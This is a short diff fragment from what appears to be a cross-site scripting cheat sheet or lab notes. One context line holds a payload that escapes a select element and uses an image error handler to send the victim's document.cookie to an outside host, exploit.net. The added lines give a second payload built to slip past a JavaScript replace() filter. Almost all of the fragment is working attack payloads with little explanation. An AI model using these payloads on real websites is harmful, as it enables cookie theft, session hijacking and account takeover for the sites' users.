@@ -14,3 +14,7 @@ Product and Store lookup
 ```html
 ?productId=1&storeId="></select><img src=x onerror=this.src='http://exploit.net/?'+document.cookie;>
 ```
+Bypass JavaScript replace()
+```JavaScript
+<><img src=1 onerror=alert(1)>
+```
